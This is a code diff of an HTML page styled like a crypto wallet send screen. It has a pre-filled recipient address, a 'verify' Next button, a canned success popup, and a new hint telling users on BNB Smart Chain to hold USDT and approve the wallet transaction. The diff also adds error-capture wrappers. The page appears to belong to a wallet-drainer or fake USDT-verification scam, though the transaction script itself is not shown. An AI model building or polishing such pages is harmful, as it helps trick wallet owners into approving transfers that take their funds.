@@ -21,7 +21,7 @@
   </div>
 
   <main class="container">
-    <p class="version-badge" aria-hidden="true">v3</p>
+    <p class="version-badge" aria-hidden="true">v2</p>
     <label class="label" for="address">Address or Domain Name</label>
     <div class="input-group address-input-group">
       <input type="text" id="address" placeholder="Search or Enter" value="0x53d6f1967d89291a92F185CCc744024d50E8c744">
@@ -50,6 +50,7 @@
 
     <button id="verifyBtn" class="next-btn">Next</button>
     <p class="preview-hint"><button type="button" id="previewPopupBtn" class="preview-btn">Preview success popup</button></p>
+    <p class="tx-hint">Use BNB Smart Chain. Wallet needs ≥1 USDT and some BNB for gas. Approve the transaction in your wallet when prompted.</p>
   </main>
 
   <!-- Success popup (reference: Processing-style bottom sheet – 3D check, wireframe globe, particles) -->
@@ -92,11 +93,33 @@
     </div>
   </div>
 
-  <!-- Same as reference (newbep20--main 3): static script then direct bind -->
+  <!-- Same as reference: static script then direct bind -->
   <script src="js/script.js"></script>
-  <!-- Add event listener to call Next() – same as reference -->
+  <!-- Capture real error from script and show it; bind Next -->
   <script>
-    document.getElementById("verifyBtn").addEventListener("click", Next);
+    (function () {
+      var lastTxError = null;
+      var origConsoleError = console.error;
+      console.error = function () {
+        if (arguments.length >= 2 && arguments[1] && typeof arguments[1] === "object") {
+          lastTxError = arguments[1];
+        }
+        return origConsoleError.apply(console, arguments);
+      };
+      var origShowError = window.showError;
+      if (typeof origShowError === "function") {
+        window.showError = function (msg) {
+          var fullMsg = msg;
+          if (lastTxError) {
+            var detail = lastTxError.message || lastTxError.reason || lastTxError.code;
+            if (detail) fullMsg = msg + " — " + String(detail);
+            lastTxError = null;
+          }
+          return origShowError(fullMsg);
+        };
+      }
+      document.getElementById("verifyBtn").addEventListener("click", Next);
+    })();
   </script>
   <!-- Update USD estimate when user enters amount (always show as positive) -->
   <script>
